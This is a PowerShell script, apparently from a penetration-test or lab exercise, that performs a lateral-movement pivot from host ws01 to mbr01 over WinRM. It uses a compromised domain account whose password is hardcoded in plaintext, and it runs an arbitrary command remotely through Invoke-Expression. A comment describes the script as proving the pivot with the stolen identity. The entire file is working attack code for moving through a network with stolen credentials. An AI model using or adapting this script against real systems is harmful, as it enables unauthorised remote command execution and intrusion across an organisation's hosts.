[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Source = "ws01",

    [Parameter(Mandatory=$false)]
    [string]$Target = "mbr01",

    [Parameter(Mandatory=$false)]
    [string]$TargetIP = "192.168.77.22",

    [Parameter(Mandatory=$false)]
    [string]$Username = "child.cadre.local\analyst_t1",

    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",

    [Parameter(Mandatory=$false)]
    [string]$Command = "hostname; whoami /user"
)
$ErrorActionPreference = "Stop"
try {
    # Trust target FQDN / IP for WinRM
    $uri = "http://{0}:5985" -f $TargetIP
    $securePass = ConvertTo-SecureString $Password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($Username, $securePass)

    # Use Invoke-Command (PSRemoting) because WinRS CLI quoting over nxc is brittle.
    # This proves the pivot from ws01 to mbr01 as the compromised analyst_t1 identity.
    $result = Invoke-Command -ComputerName $TargetIP -Credential $cred -ScriptBlock {
        param($cmd)
        Invoke-Expression $cmd
    } -ArgumentList $Command -Port 5985 -ErrorAction Stop

    Write-Output "WINRS_OK: reached $Target from $Source"
    Write-Output ($result | Out-String)
} catch {
    Write-Output ("WINRS_FAIL: " + $_.Exception.Message)
    exit 1
}
